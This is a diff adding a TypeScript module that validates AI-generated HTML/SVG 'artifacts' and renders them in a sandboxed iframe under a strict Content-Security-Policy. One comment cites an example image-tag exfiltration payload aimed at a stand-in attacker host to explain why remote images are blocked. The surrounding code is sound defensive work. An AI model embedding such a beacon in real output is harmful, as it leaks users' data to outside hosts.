@@ -1,0 +1,104 @@
+import { z } from "zod";
+
+// "Artifacts" are full HTML/SVG documents the model can render in a sandboxed
+// side panel (the Claude/ChatGPT-Canvas pattern). They run with NO access to
+// the parent page, cookies, storage, or network — see buildArtifactDoc.
+//
+// ARTIFACT ≠ WORKSPACE FILE. An artifact is the RENDERED surface, so its kind
+// stays html|svg forever: those are exactly the two ACTIVE types (web.dev,
+// "Securely hosting user data") and the sandboxed frame is the only boundary
+// this stack has. The WORKSPACE, by contrast, stores every kind the chat
+// produces — code, documents, data, tool sources — because storage is not
+// execution; see src/lib/workspaceFiles.ts for that taxonomy and for the rule
+// that nothing outside ACTIVE_KINDS may ever reach this frame. Widening the
+// enum below would hand a non-active kind an executing context; don't.
+// ARTIFACT_MAX_CONTENT is deliberately SHARED with the Workspace
+// (WORKSPACE_MAX_CONTENT re-exports it) so "too big to store" is one number.
+
+/** Hard cap on artifact content. Sized ABOVE the blueprint sheet validator's
+ *  node budget (1,500 nodes of dense presentation markup lands well past the
+ *  old 100 KB cap) — the two limits used to be uncoordinated, and a sheet
+ *  could pass the node gate, fail this one, and vanish without a trace while
+ *  the tool result claimed it was on screen. Anything the renderer can emit
+ *  under its own budget must fit here. */
+export const ARTIFACT_MAX_CONTENT = 400_000;
+
+export const ArtifactSchema = z.object({
+  // Truncate, never reject: a 200-char title must not silently drop a whole
+  // drawn document after its producer already reported it displayed.
+  title: z.preprocess((v) => (v == null || v === "" ? "Artifact" : String(v).slice(0, 160)), z.string().max(160)),
+  kind: z.enum(["html", "svg"]).catch("html"),
+  content: z.string().min(1).max(ARTIFACT_MAX_CONTENT),
+});
+
+export type Artifact = z.infer<typeof ArtifactSchema>;
+
+export function parseArtifact(raw: unknown): Artifact | null {
+  let value: unknown = raw;
+  if (typeof value === "string") {
+    try { value = JSON.parse(value); } catch { return null; }
+  }
+  const parsed = ArtifactSchema.safeParse(value);
+  return parsed.success ? parsed.data : null;
+}
+
+/** Static host page that renders artifacts (see ArtifactFrame). Artifacts are
+ *  NOT delivered by srcdoc: srcdoc inherits the embedder's CSP, which would
+ *  block the model's inline scripts in any build that ships a policy. */
+export const ARTIFACT_FRAME_PATH = "artifact-frame.html";
+
+/**
+ * The iframe's remount key — a function of the ARTIFACT ALONE.
+ *
+ * Extracted here, verbatim and behaviour-identical, so the remount contract
+ * is testable in isolation. The rule it encodes: nothing about LAYOUT may
+ * ever enter this string. Removing an iframe from the DOM runs the spec's
+ * "destroy a child navigable", which discards the active document with no
+ * unload event and no way back — and public/artifact-frame.html latches
+ * `written = true`, so a re-created frame cannot even be re-fed. A workspace
+ * panel that reloaded the user's running mini-app on every drag, rotation or
+ * fullscreen toggle would be worse than one that could not resize at all.
+ * `artifactFrameKey.length === 1` is the machine-checkable form of that rule:
+ * a second parameter is the shape any layout leak would take.
+ *
+ * KNOWN, PRESERVED BUG: keying on `content.length` rather than the content
+ * means a same-length edit leaves a stale document forever. That is a
+ * content-update bug, not a layout bug; it is kept byte-identical here on
+ * purpose and fixed separately.
+ */
+export function artifactFrameKey(a: Artifact): string {
+  return `${a.kind}-${a.content.length}-${a.title}`;
+}
+
+// Strict, locked-down CSP for the sandboxed frame:
+//  • default-src 'none'         → nothing loads unless explicitly allowed
+//  • script/style 'unsafe-inline' → the model's own inline JS/CSS may run
+//  • img/font/media data: ONLY  → embedded assets render; https: is banned
+//    because <img src="https://attacker/?d=…"> is a zero-click GET that
+//    exfiltrates data on paint (connect-src does not cover image loads)
+//  • connect-src 'none'         → no fetch/XHR/WebSocket
+//  • base-uri/form-action 'none'→ no base hijack / form posts
+const CSP =
+  "default-src 'none'; " +
+  "script-src 'unsafe-inline' 'unsafe-eval'; " +
+  "style-src 'unsafe-inline'; " +
+  "img-src data: blob:; font-src data:; media-src data: blob:; " +
+  "connect-src 'none'; base-uri 'none'; form-action 'none'";
+
+/**
+ * Wrap the model's inner body markup in a minimal document with the locked-down
+ * CSP. We supply the html/head/body shell so the CSP is always first and the
+ * model only provides body content (it's instructed not to send wrappers).
+ */
+export function buildArtifactDoc(artifact: Artifact): string {
+  return [
+    "<!DOCTYPE html><html><head>",
+    '<meta charset="utf-8">',
+    '<meta name="viewport" content="width=device-width, initial-scale=1">',
+    `<meta http-equiv="Content-Security-Policy" content="${CSP}">`,
+    "<style>html,body{margin:0}body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;padding:14px;color:#0f172a;background:#fff;line-height:1.5}img,svg{max-width:100%;height:auto}</style>",
+    "</head><body>",
+    artifact.content,
+    "</body></html>",
+  ].join("");
+}
